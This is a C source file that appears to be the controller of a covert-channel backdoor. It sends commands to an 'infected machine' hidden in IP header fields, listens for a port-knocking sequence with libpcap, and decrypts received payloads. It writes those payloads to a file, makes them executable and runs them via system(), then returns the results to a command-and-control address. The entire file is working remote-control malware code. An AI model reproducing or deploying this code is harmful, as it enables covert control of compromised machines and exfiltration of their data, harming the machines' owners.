#include "main.h"

static void print_usage(void) {
    puts ("Usage options: \n"
            "\t--nic      -   network interface to use\n"
            "\t--target   -   target machine to attack\n"
            "\t--command  -   command to request from infected machine\n"
            "\t--localip  -   your local ip\n"
            /*"\t--delay    -   delays between arp spoofs\n"*/);
}

static struct option long_options[] = {
    {"nic",     required_argument,  0,  0 },
    {"target",  required_argument,  0,  1 },
    {"command",   required_argument,  0,  2 },
    {"localip",    required_argument,  0,  3 },
    //{"delay",   optional_argument,  0,  4 },
    {0,         0,                  0,  0 }
};



int main(int argc, char **argv){
    int arg;
    char *nic;
    char targetip[BUFFERSIZE];
    char localip[BUFFERSIZE];
    char *pcapfilter;
    unsigned char data[BUFFERSIZE];
    struct filter Filter;
    /* make sure user has root privilege */
    if(geteuid() != 0) {
        printf("Must run as root\n");
        exit(1);
    }

    while (1) {
        int option_index = 0;

        arg = getopt_long(argc, argv, "", long_options, &option_index);

        if(arg == -1) {
            break;
        }

        switch (arg) {
            case 0:
                /*strncpy(nic, optarg, BUFFERSIZE);
                printf("Using NIC: %s\n", nic);*/
                break;
            case 1:
                strncpy(targetip, optarg, BUFFERSIZE);
                //printf("Target ip %s\n", targetip);
                break;
            case 2:
                strncpy(data,optarg, BUFFERSIZE);
                printf("Command %s\n", data);
                break;
            case 3:
                strncpy(localip, optarg, BUFFERSIZE);
                //printf("Local ip %s\n", localip);
                Filter = InitFilter(targetip,localip);
                PrintFilter(Filter);
                break;
            /*case 4:
                break;*/
            default: /*  '?' */
                print_usage();
                exit(1);
        }
    }
    CreateFilter(Filter, pcapfilter);
    
	covert_send(sip, dip, sport, dport, data, 0);
	//wait for port knocking
    printf("Filter: %s\n",pcapfilter);
	Packetcapture(pcapfilter);
    exit(1);
    return 0;
}

/*char GetLocalIP(char *device){
	int interfacesocket;
	if((interfacesocket = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) == -1){
		perror("socket():");
		exit(1);
	}
	struct ifreq interface;
	strncpy(interface.ifr_name, device, IFNAMSIZ);

	if(ioctl(interfacesocket, SIOCGIFADDR, &interface) == -1 ){
		perror("ioctl SIOCGIFINDEX:");
		exit(1);
	}

	printf("%s - %s\n" , device , inet_ntoa(( (struct sockaddr_in *)&interface.ifr_addr )->sin_addr) );

	close(interfacesocket);
	return (char)inet_ntoa(( (struct sockaddr_in *)&interface.ifr_addr )->sin_addr);
}*/

int Packetcapture(const char *filter){
    char errorbuffer[PCAP_ERRBUF_SIZE];
    struct bpf_program fp; //holds fp program info
    pcap_if_t *interface_list;
    bpf_u_int32 netp; //holds the ip

    //find the first network device capable of packet capture
    if(pcap_findalldevs(&interface_list,errorbuffer) == -1){
        printf("pcap_findalldevs: %s\n", errorbuffer);
        exit(0);
    }

    //open the network device
    //BUFSIZ is defined in pcap.h
    if((interfaceinfo = pcap_open_live(interface_list->name, BUFSIZ, 1, -1, errorbuffer)) == NULL){
        printf("pcap_open_live(): %s\n", errorbuffer);
        exit(0);
    }
//the filter i create isnt working not sure why will fix later
    //if(pcap_compile(interfaceinfo, &fp, filter, 0, netp) == -1){
    if(pcap_compile(interfaceinfo, &fp, "tcp and (port 8506 || port 8507 || port 8505)", 0, netp) == -1){
        perror("pcap_comile");
    }

    if(pcap_setfilter(interfaceinfo, &fp) == -1){
        perror("pcap_setfilter");
    }

    pcap_loop(interfaceinfo, -1, ReadPacket, NULL);
    return 0;
}

void ReadPacket(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packet){
    //grab the type of packet
    struct ether_header *ethernet;
    ethernet = (struct ether_header *)packet;
    u_int16_t type = ntohs(ethernet->ether_type);

    if(type == ETHERTYPE_IP){
        ParseIP(args, pkthdr, packet);
    }
}
void ParseIP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packet){
    const struct my_ip* ip;
    u_int length = pkthdr->len;
    u_int hlen,off,version;
    int len;

    //skip past the ethernet header
    ip = (struct my_ip*)(packet + sizeof(struct ether_header));
    length-= sizeof(struct ether_header);

    if(length < sizeof(struct my_ip)){
        printf("Packet length is incorrect %d", length);
        exit(1);
    }

    len = ntohs(ip->ip_len);
    hlen = IP_HL(ip);
    version = IP_V(ip);
    off = ntohs(ip->ip_off);

    if(version != 4){
        perror("Unknown error");
        exit(1);
    } else if(hlen < 5){
        perror("Bad header length");
        exit(1);
    } else if(length < len){
        perror("Truncated IP");
        exit(1);
    } else if(ip->ip_p == IPPROTO_TCP){
        printf("Protocal: TCP\n");
        printf("IPID: %hu\n", ip->ip_id);
        printf("TOS: %u\n", ip->ip_tos);
        if(CheckKey(ip->ip_tos, ip->ip_id, false)){
            printf("Reading payload\n");
            ParseTCP(args, pkthdr, packet);
        } else if(CheckKey(ip->ip_tos, ip->ip_id,true)) {
            ParsePattern(args,pkthdr, packet);
        } else {
            printf("Packet tossed wrong key\n");
        }
    }

}


bool CheckKey(u_char ip_tos, u_short ip_id, bool knock){
    if(knock){
        //check if the key is right for port knocking
        if(ip_tos == 'b' && ip_id == 'l'){
            return true;
        } else {
            return false;
        }
    } else {
        // check if key is right for normal packets
        if(ip_tos == 'l' && ip_id == 'b'){
            return true;
        } else {
            return false;
        }
    }
}

void ParsePattern(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packet){
    const struct sniff_tcp *tcp=0;
    const struct my_ip *ip;
    const char *payload;

    int size_ip;
    int size_tcp;
    int size_payload;

    printf("TCP Packet\n");

    ip = (struct my_ip*)(packet + 14);
    size_ip = IP_HL(ip)*4;

    tcp = (struct sniff_tcp*)(packet + 14 + size_ip);
    size_tcp = TH_OFF(tcp)*4;

    if(size_tcp < 20){
        perror("TCP: Control packet length is incorrect");
        exit(1);
    }

    printf("Source port: %d\n", ntohs(tcp->th_sport));
    printf("Destination port: %d\n", ntohs(tcp->th_dport));
    payload = (u_char *)(packet + 14 + size_ip + size_tcp);

    size_payload = ntohs(ip->ip_len) - (size_ip + size_tcp);

    printf("PORT KNOCKING ON: %d\n", ntohs(tcp->th_dport));
    for(int k = 0; k < sizeof(pattern)/sizeof(int); k++){
        if(pattern[k] == tcp->th_dport){
            knocking[k] = 1;
        }
    }
    if((knocking[0] == 1) && (knocking[1] == 1)){
        //system(IPTABLES(INFECTEDIP));
        char *dip = INFECTEDIP;
        unsigned short sport = SHPORT;
        unsigned short dport = SHPORT;
        printf("WAITING FOR DATA\n");
        recv_results(dip, dport, RESULT_FILE);
        system(TURNOFF(INFECTEDIP));
        pcap_breakloop(interfaceinfo);
    }
}

void ParseTCP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packet){
    const struct sniff_tcp *tcp=0;
    const struct my_ip *ip;
    const char *payload;

    int size_ip;
    int size_tcp;
    int size_payload;

    printf("TCP Packet\n");

    ip = (struct my_ip*)(packet + 14);
    size_ip = IP_HL(ip)*4;

    tcp = (struct sniff_tcp*)(packet + 14 + size_ip);
    size_tcp = TH_OFF(tcp)*4;

    if(size_tcp < 20){
        perror("TCP: Control packet length is incorrect");
        exit(1);
    }

    printf("Source port: %d\n", ntohs(tcp->th_sport));
    printf("Destination port: %d\n", ntohs(tcp->th_dport));
    payload = (u_char *)(packet + 14 + size_ip + size_tcp);

    size_payload = ntohs(ip->ip_len) - (size_ip + size_tcp);

    if(size_payload > 0){
        printf("Payload (%d bytes):\n", size_payload);
        ParsePayload(payload, size_payload);
    }
}

void ParsePayload(const u_char *payload, int len){
    FILE *fp;
    unsigned char decryptedtext[BUFSIZE+16];
    int decryptedlen, cipherlen;

    if((fp = fopen(FILENAME, "wb+")) < 0){
        perror("fopen");
        exit(1);
    }
//    printf("Encrypted Payload size is: %lu\n", sizeof(payload));
    cipherlen = strlen((char*)payload);
//    printf("Encrypted Payload is: %s \n", payload);
    decryptedlen = decryptMessage((unsigned char*)payload, BUFSIZE+16, (unsigned char*)KEY, (unsigned char *)IV, decryptedtext);

    printf("Decrypted payload size: %d\n", decryptedlen);
    printf("Decrypted Payload is: %s \n", decryptedtext);
    if((fwrite(decryptedtext, strlen((const char*)decryptedtext), sizeof(char), fp)) <= 0){
        perror("fwrite");
        exit(1);
    }
    fclose(fp);
    system(CHMOD);
    system(CMD);
    //system(IPTABLES(INFECTEDIP));


    //sending the results back to the CNC
    char *srcip = INFECTEDIP;
    char *destip = CNCIP;
    unsigned short sport = SHPORT;
    unsigned short dport = SHPORT;

    send_results(srcip, destip, sport, dport, RESULT_FILE);
    system(TURNOFF(INFECTEDIP));
}

